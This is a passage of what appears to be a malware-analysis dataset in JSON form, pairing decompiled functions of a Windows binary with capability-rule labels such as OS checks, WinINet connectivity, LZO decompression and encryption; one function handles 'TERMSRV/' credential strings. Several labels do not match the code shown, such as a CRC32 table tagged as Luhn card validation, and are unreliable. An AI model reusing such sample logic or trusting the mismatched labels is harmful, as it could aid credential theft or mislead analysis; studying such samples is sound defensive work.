        "decompiled_code": "\nvoid __cdecl fcn.00411f00(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_f0h;\n    uint32_t auStack240 [31];\n    char acStack116 [28];\n    uint var_54h;\n    uint var_38h;\n    char acStack32 [28];\n    \n    iVar3 = 0;\n    do {\n        *(&var_38h + iVar3) =\n             (*((\"80( \\x18\\x10\\b\"[iVar3] >> 3) + arg_8h) & *((\"80( \\x18\\x10\\b\"[iVar3] & 7) * 2 + 0x417608)) != 0;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x38);\n    iVar3 = 0;\n    do {\n        if (arg_ch == 1) {\n            iVar2 = iVar3 * -2 + 0x1e;\n        }\n        else {\n            iVar2 = iVar3 * 2;\n        }\n        auStack240[iVar2] = 0;\n        auStack240[iVar2 + -1] = 0;\n        iVar4 = 0;\n        do {\n            iVar1 = *(iVar3 + 0x4176b0) + iVar4;\n            if (iVar1 < 0x1c) {\n                acStack116[iVar4] = *(&var_38h + iVar1);\n            }\n            else {\n                acStack116[iVar4] = *(&var_54h + iVar1);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x1c);\n        iVar4 = 0x1c;\n        do {\n            iVar1 = *(iVar3 + 0x4176b0) + iVar4;\n            if (iVar1 < 0x38) {\n                acStack116[iVar4] = *(&var_38h + iVar1);\n            }\n            else {\n                acStack116[iVar4] = *(&var_54h + iVar1);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x38);\n        iVar4 = 0;\n        do {\n            if (acStack116[*(iVar4 + 0x4176c0)] != '\\0') {\n                auStack240[iVar2 + -1] = auStack240[iVar2 + -1] | *(iVar4 * 4 + 0x417618);\n            }\n            if (acStack116[*(iVar4 + 0x4176d8)] != '\\0') {\n                auStack240[iVar2] = auStack240[iVar2] | *(iVar4 * 4 + 0x417618);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x18);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x10);\n    fcn.0041201d(&var_f0h);\n    return;\n}\n",
        "token_count": 685
    },
    "004121e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004121e9(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar3 = (*arg_8h >> 4 ^ arg_8h[1]) & 0xf0f0f0f;\n    uVar2 = arg_8h[1] ^ uVar3;\n    uVar3 = *arg_8h ^ uVar3 << 4;\n    uVar4 = (uVar3 >> 0x10 ^ uVar2) & 0xffff;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 ^ uVar4 << 0x10;\n    uVar4 = (uVar2 >> 2 ^ uVar3) & 0x33333333;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar2 ^ uVar4 << 2;\n    uVar4 = (uVar2 >> 8 ^ uVar3) & 0xff00ff;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar4 << 8 ^ uVar2;\n    uVar2 = uVar2 * 2 | uVar2 >> 0x1f;\n    uVar4 = (uVar3 ^ uVar2) & 0xaaaaaaaa;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 * 2 | uVar3 >> 0x1f;\n    var_8h = 8;\n    do {\n        uVar4 = (uVar2 << 0x1c | uVar2 >> 4) ^ *arg_ch;\n        uVar5 = uVar2 ^ arg_ch[1];\n        uVar3 = uVar3 ^ (*((uVar5 & 0x3f) * 4 + 0x417df0) |\n                         *((uVar4 & 0x3f) * 4 + 0x417cf0) | *((uVar4 >> 6 & 0xfc) + 0x417af0) |\n                         *((uVar4 >> 0xe & 0xfc) + 0x4178f0) | *((uVar4 >> 0x16 & 0xfc) + 0x4176f0) |\n                         *((uVar5 >> 6 & 0xfc) + 0x417bf0) | *((uVar5 >> 0xe & 0xfc) + 0x4179f0) |\n                        *((uVar5 >> 0x16 & 0xfc) + 0x4177f0));\n        puVar1 = arg_ch + 3;\n        uVar4 = (uVar3 << 0x1c | uVar3 >> 4) ^ arg_ch[2];\n        arg_ch = arg_ch + 4;\n        uVar5 = uVar3 ^ *puVar1;\n        uVar2 = uVar2 ^ (*((uVar5 & 0x3f) * 4 + 0x417df0) |\n                         *((uVar4 & 0x3f) * 4 + 0x417cf0) | *((uVar4 >> 6 & 0xfc) + 0x417af0) |\n                         *((uVar4 >> 0xe & 0xfc) + 0x4178f0) | *((uVar4 >> 0x16 & 0xfc) + 0x4176f0) |\n                         *((uVar5 >> 6 & 0xfc) + 0x417bf0) | *((uVar5 >> 0xe & 0xfc) + 0x4179f0) |\n                        *((uVar5 >> 0x16 & 0xfc) + 0x4177f0));\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    uVar2 = uVar2 << 0x1f | uVar2 >> 1;\n    uVar4 = (uVar3 ^ uVar2) & 0xaaaaaaaa;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 << 0x1f | (uVar3 ^ uVar4) >> 1;\n    uVar4 = (uVar3 >> 8 ^ uVar2) & 0xff00ff;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 ^ uVar4 << 8;\n    uVar4 = (uVar3 >> 2 ^ uVar2) & 0x33333333;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 ^ uVar4 << 2;\n    uVar4 = (uVar2 >> 0x10 ^ uVar3) & 0xffff;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar2 ^ uVar4 << 0x10;\n    uVar4 = (uVar2 >> 4 ^ uVar3) & 0xf0f0f0f;\n    *arg_8h = uVar4 << 4 ^ uVar2;\n    arg_8h[1] = uVar3 ^ uVar4;\n    return;\n}\n",
        "token_count": 1254
    },
    "004125cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004125cf(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint8_t *var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    \n    fcn.004127aa(&var_180h);\n    fcn.0041248a(0x4175f0, 0);\n    iVar2 = 0;\n    do {\n        arg_ch[iVar2] = *(iVar2 + 0x4175f0);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 8);\n    bVar1 = true;\n    while ((*arg_8h != 0 || (bVar1))) {\n        var_18ch = arg_ch;\n        iVar2 = 0;\n        for (; (iVar2 < 8 && (*arg_8h != 0)); arg_8h = arg_8h + 1) {\n            *var_18ch = *arg_8h & 0x7f ^ *var_18ch;\n            *arg_8h = 0;\n            iVar2 = iVar2 + 1;\n            var_18ch = var_18ch + 1;\n        }\n        fcn.004124ce(arg_ch, arg_ch);\n        bVar1 = false;\n    }\n    fcn.004127eb(&var_180h);\n    return;\n}\n",
        "token_count": 326
    },
    "0041268d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041268d(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint8_t *var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    \n    fcn.004127aa(&var_180h);\n    fcn.0041248a(0x4175f0, 0);\n    iVar2 = 0;\n    do {\n        arg_ch[iVar2] = *(iVar2 + 0x4175f0);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x10);\n    bVar1 = true;\n    while ((*arg_8h != 0 || (bVar1))) {\n        var_18ch = arg_ch;\n        iVar2 = 0;\n        for (; (iVar2 < 0x10 && (*arg_8h != 0)); arg_8h = arg_8h + 1) {\n            *var_18ch = *arg_8h & 0x7f ^ *var_18ch;\n            *arg_8h = 0;\n            iVar2 = iVar2 + 1;\n            var_18ch = var_18ch + 1;\n        }\n        fcn.0041251f(arg_ch, arg_ch);\n        bVar1 = false;\n    }\n    fcn.004127eb(&var_180h);\n    return;\n}\n",
        "token_count": 332
    },
    "00412938": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412938(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint8_t *var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    \n    fcn.004127aa(&var_180h);\n    fcn.0041274b(0x4175f0, 0);\n    iVar2 = 0;\n    do {\n        arg_ch[iVar2] = *(iVar2 + 0x4175f0);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x18);\n    bVar1 = true;\n    while ((*arg_8h != 0 || (bVar1))) {\n        var_18ch = arg_ch;\n        iVar2 = 0;\n        for (; (iVar2 < 0x18 && (*arg_8h != 0)); arg_8h = arg_8h + 1) {\n            *var_18ch = *arg_8h & 0x7f ^ *var_18ch;\n            *arg_8h = 0;\n            iVar2 = iVar2 + 1;\n            var_18ch = var_18ch + 1;\n        }\n        fcn.0041282c(arg_ch, arg_ch);\n        bVar1 = false;\n    }\n    fcn.004127eb(&var_180h);\n    return;\n}\n",
        "token_count": 331
    },
    "00401bc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_118h;\n    uint var_112h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    iVar1 = fcn.00410790(arg_8h, &var_4h);\n    if (-1 < iVar1) {\n        var_ch = fcn.00401082(arg_8h);\n        if (3 < var_ch) {\n            iVar1 = fcn.00410670(var_4h);\n            if (iVar1 != 0) {\n                var_10h = iVar1;\n                var_8h = fcn.004018cf(var_ch);\n                fcn.00401906(var_10h, var_8h, var_ch);\n                fcn.00410676(var_4h);\n                fcn.0040193f(&var_112h, var_8h, 4);\n                iVar1 = var_8h + 4;\n                var_ch = var_ch - 4;\n                fcn.004019aa(&var_112h, iVar1, var_ch);\n                fcn.0040131f(arg_8h);\n                uVar2 = fcn.0040157e(arg_8h, iVar1, var_ch);\n                fcn.004018b8(var_8h);\n            }\n        }\n    }\n    fcn.0040129a(arg_8h);\n    return uVar2;\n}\n",
        "token_count": 359
    },
    "00402699": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402699(uint arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    iVar4 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar2 = fcn.0040262a();\n            iVar3 = extraout_ECX;\n            puVar5 = arg_10h;\n            if (0 < extraout_ECX) {\n                do {\n                    arg_10h = puVar5 + 1;\n                    *puVar5 = uVar2;\n                    uVar2 = uVar2 >> 8;\n                    iVar4 = iVar4 + 1;\n                    iVar3 = iVar3 + -1;\n                    puVar5 = arg_10h;\n                } while (iVar3 != 0);\n            }\n            iVar3 = arg_ch + -4;\n            bVar1 = 3 < arg_ch;\n            arg_ch = iVar3;\n        } while (iVar3 != 0 && bVar1);\n    }\n    return iVar4;\n}\n",
        "token_count": 270
    },
    "004018e6": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018e6(uint *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    if (arg_ch != 0) {\n        for (uVar1 = arg_ch >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *arg_8h = 0;\n            arg_8h = arg_8h + 1;\n        }\n        for (arg_ch = arg_ch & 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n            *arg_8h = 0;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "00401d9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid fcn.00401d9d(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    uVar3 = 0;\n    do {\n        uVar5 = uVar3 << 1;\n        iVar4 = 9;\n        do {\n            uVar1 = uVar5 & 1;\n            uVar5 = uVar5 >> 1;\n            if (uVar1 != 0) {\n                uVar5 = uVar5 ^ 0xedb88320;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        *(uVar3 * 4 + 0x418940) = uVar5;\n        uVar2 = uVar3 + 1;\n        uVar3 = uVar2;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 215
    },
    "004025e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004025e7(char *arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    \n    pcVar1 = fcn.004018cf((arg_ch + 0x400) * 2);\n    pcVar3 = pcVar1;\n    do {\n        for (; (arg_ch != 0 && (*arg_8h != '\\n')); arg_8h = arg_8h + 1) {\n            *pcVar3 = *arg_8h;\n            arg_ch = arg_ch + -1;\n            pcVar3 = pcVar3 + 1;\n        }\n        pcVar2 = arg_8h;\n        pcVar4 = pcVar3;\n        if (arg_ch != 0) {\n            pcVar4 = pcVar3 + 1;\n            pcVar2 = arg_8h + 1;\n            *pcVar3 = *arg_8h;\n            arg_ch = arg_ch + -1;\n        }\n        pcVar3 = pcVar4 + 1;\n        *pcVar4 = '\\0';\n        arg_8h = pcVar2;\n    } while (arg_ch != 0);\n    return pcVar1;\n}\n",
        "token_count": 286
    },
    "0040a4e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a4e9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    fcn.00401569(arg_18h, arg_8h);\n    iVar1 = fcn.00410760(arg_ch);\n    fcn.0040159f(arg_18h, arg_ch, iVar1 * 2 + 2);\n    fcn.0040159f(arg_18h, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 132
    },
    "004109af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004109af(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    return;\n}\n",
        "token_count": 166
    },
    "00410b72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00410b72(int32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x428) = 0;\n    if (*param_2 == '\\0') {\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        piVar1 = param_1 + 0x41c;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            *(param_1 + 0x418) = *(param_1 + 0x410);\n            *(param_1 + 0x41c) = 8;\n            *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n        }\n        **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n        return;\n    }\n    if (0xf < param_3) {\n        param_3 = 0xf;\n    }\n    pcVar2 = param_2 + -param_3;\n    do {\n        if (*param_2 == *pcVar2) {\n            if (param_3 != 0) {\n                piVar1 = param_1 + 0x41c;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(param_1 + 0x418) = *(param_1 + 0x410);\n                    *(param_1 + 0x41c) = 8;\n                    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n                }\n                **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n                piVar1 = param_1 + 0x41c;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(param_1 + 0x418) = *(param_1 + 0x410);\n                    *(param_1 + 0x41c) = 8;\n                    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n                }\n                **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n                piVar1 = param_1 + 0x41c;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(param_1 + 0x418) = *(param_1 + 0x410);\n                    *(param_1 + 0x41c) = 8;\n                    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n                }\n                **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n                fcn.0041096c(param_3 & 8);\n                fcn.0041096c(param_3 & 4);\n                fcn.0041096c(param_3 & 2);\n                fcn.0041096c(param_3 & 1);\n                return;\n            }\n            break;\n        }\n        param_3 = param_3 - 1;\n        pcVar2 = pcVar2 + 1;\n    } while (param_3 != 0);\n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) << 1;\n    **(param_1 + 0x410) = *param_2;\n    *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    return;\n}\n",
        "token_count": 1807
    },
    "00401dc6": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401dc6(uint32_t arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    arg_8h = ~arg_8h;\n    if (arg_10h != 0) {\n        do {\n            arg_8h = *((arg_8h ^ *arg_ch) * 4 + 0x418940) ^ arg_8h >> 8;\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return ~arg_8h;\n}\n",
        "token_count": 146
    },
    "00402091": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402091(int32_t *arg_8h)\n\n{\n    if (*arg_8h != -1) {\n        fcn.004106b8(arg_8h[2]);\n        fcn.0041065e(arg_8h[1]);\n        fcn.0041065e(*arg_8h);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "004037c6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004037c6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041082c(arg_8h);\n    if (iVar1 == -1) {\n        iVar1 = fcn.00410832(arg_8h);\n        if (iVar1 == 0) {\n            iVar1 = -1;\n        }\n        else if (*(iVar1 + 0xc) == NULL) {\n            iVar1 = -1;\n        }\n        else {\n            iVar1 = ***(iVar1 + 0xc);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 138
    },
    "004038d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    var_10ch = arg_ch;\n    var_108h = 0;\n    var_104h = 1;\n    var_100h = arg_8h;\n    iVar1 = fcn.00410850(0, &var_104h, 0, 0, &var_10ch);\n    if ((iVar1 == -1) || (iVar1 == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "0040cc29": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cc29(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401569(arg_8h, 0xbeef0000);\n    fcn.004015cb(arg_8h, arg_ch);\n    fcn.004015cb(arg_8h, arg_10h);\n    fcn.0040159f(arg_8h, arg_14h, arg_18h);\n    iVar1 = fcn.00410808(arg_10h, 0x41679f);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0041066a(\"TERMSRV/\");\n        iVar2 = fcn.00410808(arg_10h, \"TERMSRV/\");\n        if (iVar2 != 0) {\n            arg_10h = iVar2 + iVar1;\n        }\n        iVar1 = fcn.004037c6(arg_10h);\n        if (iVar1 != -1) {\n            fcn.00401569(arg_8h, 0xbeef0001);\n            fcn.004015cb(arg_8h, arg_ch);\n            fcn.00401569(arg_8h, iVar1);\n            fcn.0040159f(arg_8h, arg_14h, arg_18h);\n        }\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "0040949c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040949c(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar1 = fcn.00401df8(arg_8h, 0);\n    iVar2 = fcn.0041066a(pcVar1);\n    if (iVar2 != 0) {\n        pcVar3 = pcVar1 + iVar2;\n        while ((pcVar3 = pcVar3 + -1,  pcVar1 <= pcVar3 && ((*pcVar3 == '\\r' || (*pcVar3 == '\\n'))))) {\n            *pcVar3 = '\\0';\n        }\n    }\n    return pcVar1;\n}\n",
        "token_count": 160
    },
    "00402e72": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402e72(int32_t arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint in_EDX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t var_14h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_14h = arg_ch >> 6;\n    *(arg_8h + arg_ch) = 0x80;\n    iVar2 = (arg_8h + arg_ch) - (arg_ch & 0x3f);\n    if (0x37 < (arg_ch & 0x3f)) {\n        iVar2 = iVar2 + 0x40;\n        var_14h = var_14h + 1;\n    }\n    *(iVar2 + 0x38) = arg_ch * 8;\n    var_10h = 0x67452301;\n    uStack16 = 0xefcdab89;\n    uStack12 = 0x98badcfe;\n    uStack8 = 0x10325476;\n    fcn.00402efd(&var_10h, arg_8h, var_14h);\n    puVar1 = &var_10h;\n    for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *arg_10h = *puVar1;\n        puVar1 = puVar1 + 1;\n        arg_10h = arg_10h + 1;\n    }\n    return CONCAT44(var_14h, in_EDX);\n}\n",
        "token_count": 366
    },
    "0041201d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041201d(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uint var_80h;\n    uint32_t auStack128 [31];\n    \n    puVar3 = &var_80h;\n    iVar2 = 0x10;\n    do {\n        puVar1 = arg_8h + 1;\n        *puVar3 = (*arg_8h & 0xfc0000) << 6 | (*arg_8h & 0xfc0) << 10 | (*puVar1 & 0xfc0000) >> 10;\n        puVar4 = puVar3 + 1;\n        *puVar3 = (*puVar1 & 0xfc0) >> 6 | *puVar3;\n        *puVar4 = (*arg_8h & 0x3f000) << 0xc | (*arg_8h & 0x3f) << 0x10 | (*puVar1 & 0x3f000) >> 4;\n        puVar3 = puVar3 + 2;\n        *puVar4 = *puVar1 & 0x3f | *puVar4;\n        iVar2 = iVar2 + -1;\n        arg_8h = arg_8h + 2;\n    } while (iVar2 != 0);\n    fcn.004120de(&var_80h);\n    return;\n}\n",
        "token_count": 341
    },
    "00402efd": {
        "rules": [
            "encrypt data using Sosemanuk/d9cb91cf002a4780a153bbbb736437ff"
        ],
